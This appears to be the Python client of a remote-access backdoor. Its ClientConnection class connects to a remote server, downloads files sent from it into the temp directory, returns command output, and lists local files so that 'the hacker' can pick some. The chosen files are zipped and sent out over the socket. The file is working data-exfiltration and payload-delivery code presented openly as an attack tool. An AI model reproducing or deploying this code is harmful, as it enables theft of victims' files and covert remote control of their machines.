import socket
import os
import tempfile
import glob
import json

import zipfile

HEADER_SIZE = 10


CHUNK_SIZE = 4 * 1024
END_DELIMETER = "*END_OF_FILE*"
COMMAND_DELIMETER = "<END_OF_COMMAND>"


def zip_it(to_download):

    # ziph is zipfile handle
    if os.path.isdir(to_download):
        zipped_name = to_download + ".zip"
        zipf = zipfile.ZipFile(zipped_name, 'w', zipfile.ZIP_DEFLATED)

        for root, dirs, files in os.walk(to_download):
            for file in files:
                zipf.write(os.path.join(root, file))
        zipf.close()
    else:
        base_name = os.path.basename(to_download)
        name, ext = os.path.splitext(base_name)
        toZip = name
        zipped_name = toZip+'.zip'
        zipfile.ZipFile(zipped_name, mode='w').write(base_name)

    return zipped_name

class ClientConnection:
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def Connect(self, server_ip, server_port):
        self.socket.connect((server_ip, server_port))
        self.server_ip = server_ip
        self.server_port = server_port

    def receive_data(self):
        self.data_in_bytes = self.socket.recv(1024)
        self.data = self.data_in_bytes.decode("utf-8")
        return self.data

    def send_data(self, data):
        self.data_in_bytes = bytes(data, "utf-8")
        self.socket.send(self.data_in_bytes)

    def receive_file(self):
        tmp = tempfile.gettempdir()
        file_name = self.receive_data()

        path_dir, actual_file_name = os.path.split(file_name)

        temp_path = os.path.join(tmp, actual_file_name)
        with open(temp_path, "wb") as file:
            while True:
                chunk = self.socket.recv(CHUNK_SIZE)

                if chunk.endswith(END_DELIMETER.encode()):

                    chunk = chunk[:-len(END_DELIMETER)]

                    file.write(chunk)
                    print("[+] Completed Transfer")
                    break

                if "NOT_FOUND".encode() in chunk:
                    print("[-] Unable to locate file")
                    break
                file.write(chunk)

    def send_command_result(self, command_result):
        print("[+] Sending Command Result")
        chunk = command_result + COMMAND_DELIMETER
        chunk_bytes = chunk.encode()

        self.socket.sendall(chunk_bytes)

    def send_file(self):
        print("[+] Sending file")
        # first find the list of files to be uploaded
        files = glob.glob("*")
        dict = {}
        for index, file in enumerate(files):
            dict[index] = file
        dict_bytes = json.dumps(dict)

        # send list of files to the hacker for him to select files
        bytes_with_delimeter = dict_bytes + END_DELIMETER
        self.socket.send(bytes_with_delimeter.encode())

        # receive the file name to download
        file2download = self.receive_data()

        print("[+] File/Folder selected : ", file2download)

        zipped_name = zip_it(file2download)
        file_content = b''
        with open(zipped_name, "rb") as file:
            file_content = file.read()
        self.send_data(zipped_name)
        self.socket.send(file_content+END_DELIMETER.encode())
        os.remove(zipped_name)


    def Close(self):
        self.socket.close()



